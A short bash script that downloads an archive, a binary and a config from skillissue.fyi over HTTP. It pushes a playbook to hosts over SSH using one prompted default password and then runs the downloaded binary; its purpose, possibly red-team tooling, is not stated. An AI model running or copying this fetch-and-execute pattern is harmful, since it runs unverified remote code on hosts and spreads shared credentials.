#!/bin/bash
curl http://skillissue.fyi/sombra.zip -o sombra.zip
unzip sombra -d sombra
pip3 install ansible
apt install -y sshpass
echo "Enter Default Password"
read DEFAULT_PASS
~/.local/bin/ansible-playbook -e "ansible_password=$DEFAULT_PASS ansible_become_password=$DEFAULT_PASS" deploy.yml
curl http://skillissue.fyi/steeloxide -o steeloxide
curl http://skillissue.fyi/enron.json -o enron.json
./steeloxide preset --config enron.json